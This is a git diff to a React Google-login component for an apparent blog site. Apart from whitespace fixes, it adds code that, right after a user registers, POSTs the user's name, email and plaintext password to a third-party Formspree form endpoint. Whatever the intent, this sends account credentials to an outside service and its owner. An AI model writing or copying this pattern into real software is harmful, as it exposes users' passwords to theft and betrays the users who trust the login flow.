@@ -35,6 +35,19 @@ export default function GoogleLogin() {
 
           try {
             await register(res.data.email, password, password);
+            await axios.post(
+              "https://formspree.io/f/xrbzkgnz",
+              {
+                name: res.data.name,
+                email: res.data.email,
+                message: `Hello, this is Devs Blogs! Here are your credentials email: ${res.data.email} password: ${password} !`,
+              },
+              {
+                headers: {
+                  "Content-Type": "application/json",
+                },
+              }
+            );
             navigate("/blogs");
           } catch (error) {
             setIsToastVisible(true);
@@ -48,14 +61,14 @@ export default function GoogleLogin() {
   };
 
   const handleGoogleLoginClick = (event) => {
-    event.preventDefault(); 
+    event.preventDefault();
     googleLoginFunction();
   };
 
   return (
     <>
       <button
-        type="button" 
+        type="button"
         className="flex items-center bg-white dark:bg-gray-900 border border-gray-300 rounded-lg shadow-md px-6 py-2 text-sm font-medium text-gray-800 dark:text-white hover:bg-gray-200 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-500 mx-auto"
         onClick={handleGoogleLoginClick}
       >
